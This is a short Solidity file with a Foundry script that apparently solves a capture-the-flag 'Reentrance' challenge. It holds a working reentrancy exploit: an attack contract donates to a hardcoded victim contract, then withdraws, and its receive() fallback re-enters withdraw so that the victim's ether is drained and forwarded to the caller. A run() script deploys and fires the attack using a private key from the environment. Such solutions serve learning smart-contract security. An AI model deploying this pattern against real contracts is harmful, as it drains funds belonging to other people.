//SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "../src/Reentracy.sol";
import {Script, console} from "forge-std/Script.sol";

contract AttackReentrance {
    
    Reentrance public victim = Reentrance(payable(0x0d426e1790352EFd05b823D954046eD88BcE2347));

    constructor() public payable{
        victim.donate{value: 0.001 ether}(address(this));
    }
   
    function attack() external payable {
 
            victim.withdraw(0.001 ether);
            (bool result, ) = msg.sender.call{value: address(this).balance}(""); 
            
    }
    receive() external payable {
            victim.withdraw(0.001 ether);
            
    }
}

contract ReentrancySolution is Script{
    
    function run() external{
        vm.startBroadcast(vm.envUint("MY_PRIVATE_KEY"));
        AttackReentrance attackReentrance = new AttackReentrance{value: 0.001 ether}();
        attackReentrance.attack();
        vm.stopBroadcast();
    }
}